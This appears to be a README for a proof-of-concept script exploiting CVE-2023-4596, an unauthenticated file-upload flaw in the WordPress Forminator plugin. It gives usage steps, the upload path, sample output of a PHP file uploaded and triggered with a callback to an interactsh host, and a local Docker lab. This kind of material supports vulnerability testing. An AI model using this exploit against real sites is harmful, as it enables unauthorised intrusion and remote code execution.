# CVE-2023-4596
PoC Script for CVE-2023-4596, unauthenticated Remote Command Execution through arbitrary file uploads.
<br>
<br>
[Nuclei Template](https://github.com/projectdiscovery/nuclei-templates/pull/8118/files)
<br>
[WordFence](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/forminator/forminator-1246-unauthenticated-arbitrary-file-upload)
<br>

# Disclaimer
The script provided is for educational purposes only; I am not responsible for your actions.
<br>
<br>

# PoC
Find a page running Forminator <= 1.24.6 with an upload function on the page. Copy the full URL and generate an interactsh link, files will be uploaded in /wp-content/uploads/[current year]/[current month]/file.php. 
<br>
<br>
After a succesful upload, a request should apair in interactsh within 5 seconds, indicating it is vulnerable. The code can be easily modified to create an RCE, but to prevent skiddies from misusing the poc, I've only made an intrusive way to confirm a vulnerable instance.

```
user@debian:~$ python3 exploit.py -u http://127.0.0.1:8000/?p=7
Input interactsh link: <input interactsh link>

[+] Sending payload to target
[+] Successful file upload!

Uploaded File Location: http://127.0.0.1:8000/wp-content/uploads/2023/08/ping.php

[+] Sending request to uploaded file...
[+] Successfully triggerd the uploaded file!
[+] Check Interactsh for an incoming request.
```


## Local install
1. cd CVE-2023-4596/ && docker compose -f - up 
2. Browse to http://127.0.0.1:8000
3. Set up a wp account and upload the plugin found [here](https://wordpress.org/plugins/forminator/advanced/) on version 1.24.6
4. Enjoy
